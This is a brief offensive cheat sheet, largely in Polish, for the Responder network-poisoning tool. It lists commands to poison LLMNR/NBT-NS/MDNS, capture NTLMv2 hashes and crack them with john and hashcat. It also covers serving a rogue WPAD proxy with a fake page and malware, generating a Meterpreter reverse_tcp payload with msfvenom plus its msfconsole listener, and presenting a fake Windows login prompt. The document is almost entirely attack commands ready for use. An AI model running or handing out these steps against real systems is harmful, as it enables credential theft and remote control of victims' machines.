## RESPONDER
### Intro
Responder an LLMNR, NBT-NS and MDNS poisoner
### Preq
### Config
/usr/share/responder/Responder.conf
### Uses
Zatruwanie i zbieranie hashy NTLM  
``responder -I eth0``  
*(john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2)*  
*(hashcat -m 5600 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable)*
#### Podkladanie WPAD - fake www + malware
``responder -I eth0 -wFfbv``  
*Serve-Html = on*  
*Serve-Exe = on*  
##### Malware example  
``msfvenom -p windows/x64/meterpreter/reverse_tcp lhost= $srcIP lport=$lPort -f exe > payload.exe``  
`` msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $srcIP; set LPORT $lPort; run; exit -y;"``  
or
``use exploit/multi/handler``  
``set lhost _IP_``  
``set lport 4444``  
``set payload windows/x64/meterpreter/reverse_tcp``  
#### Podkladanie WPAD - fakowe windowsowe okno logowania do strony w przegladarce
``responder -I eth0 -r On -w On -wFb``  
*Serve-Html = off*  
*Serve-Exe = off*

